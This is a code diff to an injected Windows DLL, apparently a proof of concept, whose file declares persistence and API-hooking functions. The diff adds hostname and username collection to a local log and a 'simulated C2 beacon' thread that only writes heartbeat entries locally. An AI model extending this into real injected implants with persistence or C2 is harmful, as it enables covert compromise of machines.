@@ -28,6 +28,29 @@ bool EstablishDLLPersistence(HMODULE hModule);
 bool HookAPIForPersistence();
 void MaintainProcessStability();
 
+// Forward declaration for beacon
+static DWORD WINAPI BeaconThread(LPVOID param);
+static HANDLE g_BeaconThread = NULL;
+
+// Collect system information for proof log
+std::string GetHostname()
+{
+    char buf[MAX_COMPUTERNAME_LENGTH + 1];
+    DWORD size = sizeof(buf);
+    if (GetComputerNameA(buf, &size))
+        return std::string(buf);
+    return "UNKNOWN";
+}
+
+std::string GetUsername()
+{
+    char buf[256];
+    DWORD size = sizeof(buf);
+    if (GetUserNameA(buf, &size))
+        return std::string(buf);
+    return "UNKNOWN";
+}
+
 // Get current timestamp as string
 std::string GetTimestamp()
 {
@@ -102,6 +125,10 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserv
                 logFile << "    DLL Path: " << dllPath << std::endl;
                 logFile << "    Base Address: 0x" << std::hex << (DWORD_PTR)hModule << std::dec << std::endl;
                 logFile << std::endl;
+                logFile << "[*] System Information:" << std::endl;
+                logFile << "    Hostname: " << GetHostname() << std::endl;
+                logFile << "    Username: " << GetUsername() << std::endl;
+                logFile << std::endl;
                 logFile << "[*] Persistence Status:" << std::endl;
                 logFile << "    Persistence mechanisms active from installer" << std::endl;
                 logFile << std::endl;
@@ -130,6 +157,10 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserv
             }
 
             LogDLLActivity("DLL initialization completed successfully");
+
+            // Start beacon heartbeat thread — demonstrates the DLL is alive
+            // and executing inside the target process after injection.
+            g_BeaconThread = CreateThread(NULL, 0, BeaconThread, NULL, 0, NULL);
         }
         catch (...)
         {
@@ -159,6 +190,26 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserv
         break;
     }
     return TRUE;
+}
+
+// ============================================================
+// BEACON HEARTBEAT — proves the DLL is alive inside the target
+// ============================================================
+
+static DWORD WINAPI BeaconThread(LPVOID)
+{
+    // Simulate a C2 beacon: write a heartbeat entry every 30 seconds
+    // to show the DLL is actively running inside the injected process.
+    for (int i = 1; i <= 10; ++i)   // run for ~5 minutes then stop
+    {
+        Sleep(30000);
+        LogDLLActivity("[BEACON] Heartbeat #" + std::to_string(i)
+            + " — DLL active in " + GetHostProcessName()
+            + " (PID " + std::to_string(GetCurrentProcessId()) + ")"
+            + " on " + GetHostname());
+    }
+    LogDLLActivity("[BEACON] Beacon series complete — DLL going dormant");
+    return 0;
 }
 
 // ============================================================
